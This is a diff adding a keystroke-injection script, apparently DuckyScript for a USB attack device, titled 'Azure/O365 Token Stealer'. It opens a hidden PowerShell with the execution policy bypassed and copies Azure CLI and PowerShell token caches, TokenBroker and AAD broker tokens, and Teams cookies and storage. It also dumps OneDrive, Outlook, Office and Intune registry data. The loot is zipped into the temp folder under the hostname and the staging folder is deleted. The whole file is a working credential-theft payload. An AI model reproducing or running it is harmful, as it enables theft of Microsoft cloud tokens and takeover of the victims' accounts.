@@ -1,0 +1,80 @@
+REM =============================================
+REM Title: Azure/O365 Token Stealer
+REM Author: bad-antics
+REM Description: Extract Microsoft cloud tokens and configs
+REM Category: nullsec/exfil
+REM Target: Windows 10/11
+REM =============================================
+
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -w hidden -ep bypass
+ENTER
+DELAY 800
+
+REM Create loot directory
+STRING $d="$env:TEMP\azureloot";mkdir $d -Force|Out-Null
+ENTER
+DELAY 200
+
+REM Azure CLI token cache
+STRING if(Test-Path "$env:USERPROFILE\.azure"){cp -r "$env:USERPROFILE\.azure\*" "$d\azure_cli\" -Force 2>$null}
+ENTER
+DELAY 300
+
+REM Azure PowerShell tokens
+STRING if(Test-Path "$env:USERPROFILE\.Azure"){cp -r "$env:USERPROFILE\.Azure\*" "$d\azure_ps\" -Force 2>$null}
+ENTER
+DELAY 300
+
+REM Microsoft Graph tokens
+STRING $graphPath="$env:LOCALAPPDATA\Microsoft\TokenBroker\Cache";if(Test-Path $graphPath){cp -r "$graphPath\*" "$d\token_broker\" -Force}
+ENTER
+DELAY 300
+
+REM OneDrive account info
+STRING if(Test-Path "HKCU:\Software\Microsoft\OneDrive\Accounts"){Get-ChildItem "HKCU:\Software\Microsoft\OneDrive\Accounts"|%{Get-ItemProperty $_.PSPath}|Out-File "$d\onedrive_accounts.txt"}
+ENTER
+DELAY 200
+
+REM Teams tokens
+STRING if(Test-Path "$env:APPDATA\Microsoft\Teams"){cp "$env:APPDATA\Microsoft\Teams\storage.json" "$d\teams_storage.json" 2>$null;cp "$env:APPDATA\Microsoft\Teams\Cookies" "$d\teams_cookies" 2>$null;cp "$env:APPDATA\Microsoft\Teams\Local Storage\leveldb\*" "$d\teams_leveldb\" -Force 2>$null}
+ENTER
+DELAY 300
+
+REM Outlook cached credentials
+STRING if(Test-Path "HKCU:\Software\Microsoft\Office\16.0\Outlook\Profiles"){Get-ChildItem "HKCU:\Software\Microsoft\Office\16.0\Outlook\Profiles" -Recurse|Get-ItemProperty|Out-File "$d\outlook_profiles.txt" 2>$null}
+ENTER
+DELAY 200
+
+REM Office MRU (recent documents with paths)
+STRING Get-ItemProperty "HKCU:\Software\Microsoft\Office\16.0\*\File MRU" 2>$null|Out-File "$d\office_recent.txt"
+ENTER
+DELAY 200
+
+REM SharePoint/OneDrive sync info
+STRING if(Test-Path "$env:LOCALAPPDATA\Microsoft\OneDrive\settings"){cp -r "$env:LOCALAPPDATA\Microsoft\OneDrive\settings" "$d\onedrive_settings" -Force}
+ENTER
+DELAY 200
+
+REM AAD broker tokens
+STRING $aadPath="$env:LOCALAPPDATA\Packages\Microsoft.AAD.BrokerPlugin_*";Get-ChildItem $aadPath -ErrorAction SilentlyContinue|%{cp -r "$($_.FullName)\AC\TokenBroker" "$d\aad_broker\" -Force 2>$null}
+ENTER
+DELAY 300
+
+REM Intune enrollment info
+STRING Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Enrollments\*" 2>$null|Out-File "$d\intune_enrollment.txt"
+ENTER
+DELAY 200
+
+REM Compress
+STRING Compress-Archive -Path $d -DestinationPath "$env:TEMP\azure_$(hostname).zip" -Force
+ENTER
+DELAY 500
+
+STRING Remove-Item $d -Recurse -Force
+ENTER
+
+STRING exit
+ENTER
